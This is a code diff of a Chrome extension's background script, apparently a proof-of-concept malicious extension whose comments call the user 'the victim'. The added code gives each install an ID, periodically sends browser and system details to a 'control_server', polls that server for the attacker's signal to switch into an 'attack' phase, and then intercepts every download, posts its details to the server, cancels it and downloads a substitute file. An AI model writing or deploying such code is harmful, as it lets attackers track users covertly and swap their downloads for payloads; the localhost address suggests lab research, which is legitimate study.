@@ -1,4 +1,19 @@
 //START, UID CREATION, PHASE STATE
+
+/*
+The UId of the user is create in base of the time of first installation in UTC,
+this date is put in a simple SHASH for obtaining an unique and ofuscate id
+
+This UID is stored locally, but could be stored in sync for better knowdleged of the victim
+
+The UID do not change with updates or by shuting the extension, only if the extension is removed
+the UID would be lost
+
+In the other hand, the phase state is restarted with updates of the extension, but this should not be a problem
+
+*/
+
+
 chrome.runtime.onInstalled.addListener(function setuid(){
     const First_installed = Date.now().toString();
     console.log(First_installed)
@@ -38,6 +53,15 @@ chrome.runtime.onInstalled.addListener(function setuid(){
 
 //INFO (POC_Detective and Extension combined)
 
+/*
+In short words, calls to relevant APIs asking for information that could help indentify the victim
+
+In general all of this calls are not relevant and should not take the attention of the system if they are
+not done commonly.
+
+(for short periods an Alarm is used, for longer periods, that is,
+     months a local storage solution with dates shall be used)
+*/
 function logCPU(C){
     fetch('http://127.0.0.1:5000/control_server',
             {
@@ -116,7 +140,7 @@ function loggingprivacySettings(){
 //chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){console.log(details)});
 //https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings
 
-chrome.alarms.create("info",{ periodInMinutes: 0.07 });
+chrome.alarms.create("info",{ periodInMinutes: 2 });
 
 chrome.alarms.onAlarm.addListener((Alarm)=>{
     if (Alarm.name == "info"){
@@ -147,25 +171,68 @@ chrome.alarms.onAlarm.addListener((Alarm)=>{
 
 
 //WAIT (GET request)
+/*
+In a regular basis the system ask the server if it should change mode to attack version,
+the GET request will be done with the uid of the victim
+
+The change of mode will happen by desired of the attacker when an interesting target has been 
+indentifie.
+
+(for short periods an Alarm is used, for longer periods, that is,
+     months a local storage solution with dates shall be used)
+*/
 
 
 
 
-
-chrome.alarms.create("phase",{ periodInMinutes: 2 });
+chrome.alarms.create("phase",{ periodInMinutes: 0.05 });
 //https://stackoverflow.com/questions/60727329/chrome-extension-rejection-use-of-permissions-all-urls
 
 chrome.alarms.onAlarm.addListener((Alarm) => {
 
     if (Alarm.name == "phase"){
-        fetch('http://127.0.0.1:5000/request',
+
+        fetch('http://127.0.0.1:5000/req',
             {
             method: "GET",
             mode: 'no-cors', 
             headers:{"Content-Type": "application/json"}
-            }).then(r => r.text()).then(result => {console.log(result)})
+            }).then(r => r.text()).then(result => {
+                if(result == "2"){
+                    chrome.storage.local.set({phase:1});
+                };
+            })
+
     }
 
 })
 
 //ATTACK (Download API)
+
+
+chrome.alarms.create("dow",{ periodInMinutes: 0.05 });
+
+
+
+
+function modify(item){
+    chrome.storage.local.get(["uid"]).then((result)=>{
+    
+        fetch('http://127.0.0.1:5000/control_server',
+        {
+        method: "POST",
+        mode: 'no-cors', 
+        body: JSON.stringify(item),
+        headers:{"Content-Type": "application/json"}
+        })
+        chrome.downloads.cancel(item.id)
+        chrome.downloads.download({url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg"});
+        });
+ 
+}
+
+
+//https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg
+//chrome.downloads.onChanged.addListener((Delta)=>{FileOpen(Delta)})
+
+chrome.downloads.onCreated.addListener((Item)=>{modify(Item)})
